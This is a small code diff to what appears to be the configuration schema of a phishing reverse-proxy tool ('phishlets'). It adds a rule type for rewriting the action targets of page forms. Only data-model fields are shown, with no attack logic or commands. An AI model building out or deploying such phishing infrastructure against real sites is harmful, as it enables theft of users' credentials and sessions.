@@ -45,6 +45,10 @@ class CookieRewriteRule(BaseModel):
     path_to: Optional[str] = None
     samesite: Optional[str] = None
     secure: Optional[bool] = None
+    
+class FormActionRule(BaseModel):
+    selector: str
+    action_to: str
 
 class ResourceBlockRule(BaseModel):
     pattern: str
@@ -65,6 +69,7 @@ class PhishletConfig(BaseModel):
     path_rewrites: List[PathRewriteRule] = []
     cookie_rewrites: List[CookieRewriteRule] = []
     blocklist: List[ResourceBlockRule] = []
+    form_actions: List[FormActionRule] = []
 
 class PhishletLoader:
     def __init__(self):
